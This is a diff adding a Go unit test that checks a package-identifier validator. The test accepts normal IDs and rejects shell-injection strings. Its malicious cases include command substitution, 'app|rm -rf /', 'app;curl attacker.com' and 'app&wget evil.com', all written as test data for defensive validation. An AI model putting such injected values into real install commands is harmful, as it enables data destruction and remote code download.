@@ -63,6 +63,70 @@ func TestGetInstallAndRemoveScript(t *testing.T) {
 	}
 }
 
+func TestValidatePackageIdentifiers(t *testing.T) {
+	t.Parallel()
+
+	t.Run("valid identifiers", func(t *testing.T) {
+		validIDs := []string{
+			"com.example.app",
+			"ruby",
+			"org.mozilla.firefox",
+			"{12345-ABCDE-67890}",
+			"Microsoft.VisualStudioCode",
+			"package/name",
+			"my-app_v2.0+build1",
+			"app:latest",
+			"name@version",
+			"path/to/pkg",
+			"a~b",
+			"comma,separated",
+			"with spaces",
+		}
+		require.NoError(t, ValidatePackageIdentifiers(validIDs, ""))
+		require.NoError(t, ValidatePackageIdentifiers(nil, "{UPGRADE-CODE-123}"))
+		require.NoError(t, ValidatePackageIdentifiers(validIDs, "{UPGRADE-CODE-123}"))
+	})
+
+	t.Run("empty inputs", func(t *testing.T) {
+		require.NoError(t, ValidatePackageIdentifiers(nil, ""))
+		require.NoError(t, ValidatePackageIdentifiers([]string{}, ""))
+	})
+
+	t.Run("malicious package IDs", func(t *testing.T) {
+		maliciousIDs := []struct {
+			name string
+			id   string
+		}{
+			{"command substitution", "com.app$(id)"},
+			{"backtick execution", "app`id`"},
+			{"pipe injection", "app|rm -rf /"},
+			{"semicolon injection", "app;curl attacker.com"},
+			{"ampersand injection", "app&wget evil.com"},
+			{"redirect output", "app>file"},
+			{"redirect input", "app<file"},
+			{"single quote", "app'break"},
+			{"double quote", `app"break`},
+			{"backslash", `app\n`},
+			{"newline", "app\nid"},
+			{"exclamation", "app!cmd"},
+		}
+		for _, tc := range maliciousIDs {
+			t.Run(tc.name, func(t *testing.T) {
+				err := ValidatePackageIdentifiers([]string{tc.id}, "")
+				require.Error(t, err)
+				assert.Contains(t, err.Error(), "contains invalid characters")
+			})
+		}
+	})
+
+	t.Run("malicious upgrade code", func(t *testing.T) {
+		err := ValidatePackageIdentifiers(nil, "code$(id)")
+		require.Error(t, err)
+		assert.Contains(t, err.Error(), "upgrade code")
+		assert.Contains(t, err.Error(), "contains invalid characters")
+	})
+}
+
 func assertGoldenMatches(t *testing.T, goldenFile string, actual string, update bool) {
 	t.Helper()
 	if goldenFile == "" {
